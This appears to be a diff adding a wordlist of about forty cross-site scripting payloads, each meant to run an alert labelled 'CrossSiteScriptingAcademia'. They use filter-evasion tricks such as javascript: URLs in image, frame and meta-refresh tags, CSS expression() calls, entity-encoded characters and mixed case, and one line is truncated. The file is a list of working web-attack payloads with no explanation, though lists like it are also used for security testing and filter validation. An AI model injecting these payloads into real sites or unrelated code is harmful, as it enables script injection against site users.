@@ -1,0 +1,44 @@
+<script>alert('CrossSiteScriptingAcademia')</script>
+<SCRIPT>alert('CrossSiteScriptingAcademia')</SCRIPT>
+<BASE HREF="javascript:alert('CrossSiteScriptingAcademia');//">
+<BGSOUND SRC="javascript:alert('CrossSiteScriptingAcademia');">
+<BODY BACKGROUND="javascript:alert('CrossSiteScriptingAcademia');">
+<BODY ONLOAD=alert('CrossSiteScriptingAcademia')>
+<DIV STYLE="background-image: url(javascript:alert('CrossSiteScriptingAcademia'))">
+<DIV STYLE="background-image: url(&amp;#1;javascript:alert('CrossSiteScriptingAcademia'))">
+<DIV STYLE="width: expression(alert('CrossSiteScriptingAcademia'));">
+<FRAMESET><FRAME SRC="javascript:alert('CrossSiteScriptingAcademia');"></FRAMESET>
+<IFRAME SRC="javascript:alert('CrossSiteScriptingAcademia');"></IFRAME>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('CrossSiteScriptingAcademia');">
+<IMG SRC="javascript:alert('CrossSiteScriptingAcademia');">
+<IMG SRC=javascript:alert('CrossSiteScriptingAcademia')>
+<IMG DYNSRC="javascript:alert('CrossSiteScriptingAcademia');">
+<IMG LOWSRC="javascript:alert('CrossSiteScriptingAcademia');">
+exp/*<XSS STYLE='no\xss:noxss("*//*");xss:&amp;#101;x&amp;#x2F;*XSS*//*/*/pression(alert("CrossSiteScriptingAcademia"))'>
+<IMG SRC='vbscript:msgbox("CrossSiteScriptingAcademia")'>
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('CrossSiteScriptingAcademia');">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('CrossSiteScriptingAcademia');">
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f
+<IMG STYLE="xss:expr/*XSS*/ession(alert('CrossSiteScriptingAcademia'))">
+<XSS STYLE="xss:expression(alert('CrossSiteScriptingAcademia'))">
+<STYLE>.XSS{background-image:url("javascript:alert('CrossSiteScriptingAcademia')");}</STYLE><A CLASS=XSS></A>
+<STYLE type="text/css">BODY{background:url("javascript:alert('CrossSiteScriptingAcademia')")}</STYLE>
+<LINK REL="stylesheet" HREF="javascript:alert('CrossSiteScriptingAcademia');">
+<TABLE BACKGROUND="javascript:alert('CrossSiteScriptingAcademia')"></TABLE>
+<TABLE><TD BACKGROUND="javascript:alert('CrossSiteScriptingAcademia')"></TD></TABLE>
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('CrossSiteScriptingAcademia')</SCRIPT>">
+<BR SIZE="&amp;{alert('CrossSiteScriptingAcademia')}">
+<IMG SRC=JaVaScRiPt:alert('CrossSiteScriptingAcademia')>
+<IMG SRC=javascript:alert(&amp;quot;CrossSiteScriptingAcademia&amp;quot;)>
+<IMG SRC=`javascript:alert("CrossSiteScriptingAcademia")`>
+</TITLE><SCRIPT>alert("CrossSiteScriptingAcademia");</SCRIPT>
+<STYLE>@im\port'\ja\vasc\ript:alert("CrossSiteScriptingAcademia")';</STYLE>
+<IMG SRC="javascript:alert('CrossSiteScriptingAcademia');">
+<IMG SRC="jav&amp;#x09;ascript:alert('CrossSiteScriptingAcademia');">
+<IMG SRC="jav&amp;#x0A;ascript:alert('CrossSiteScriptingAcademia');">
+<IMG SRC="jav&amp;#x0D;ascript:alert('CrossSiteScriptingAcademia');">
+<IMG SRC=" &amp;#14;javascript:alert('CrossSiteScriptingAcademia');">
+<IMG SRC="javascript:alert('CrossSiteScriptingAcademia')"
+<SCRIPT>alert("CrossSiteScriptingAcademia");//<</SCRIPT>
+<IMG """><SCRIPT>alert("CrossSiteScriptingAcademia")</SCRIPT>">
+<SCRIPT>a=/CrossSiteScriptingAcademia/alert(a.source)</SCRIPT>
